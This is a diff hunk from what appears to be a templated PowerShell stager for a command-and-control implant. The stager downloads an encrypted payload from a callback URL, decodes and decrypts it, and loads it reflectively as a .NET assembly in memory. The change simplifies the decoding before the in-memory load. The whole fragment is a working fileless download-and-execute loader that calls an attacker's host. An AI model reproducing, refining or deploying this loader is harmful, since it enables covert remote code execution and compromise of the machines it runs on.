@@ -26,9 +26,7 @@ if (-not ([System.Management.Automation.PSTypeName]"$string1").Type) {
     $DLL = $K.downloadstring(${{symbol_name("CALLBACK_URL")}}+'l?arch='+$arch)
     $DLL = [System.Convert]::FromBase64String($DLL)
     $DLL = {{symbol_name("Decrypt-Code")}} $DLL ${{symbol_name("KEY")}}
-    $DLL = [System.Text.Encoding]::ASCII.GetString($DLL)
-    $DLL = [System.Convert]::FromBase64String($DLL)
-    $assembly = [system.Reflection.Assembly]::Load($DLL)
+    $assembly = [system.Reflection.Assembly]::Load([byte[]]$DLL)
 }
 
 
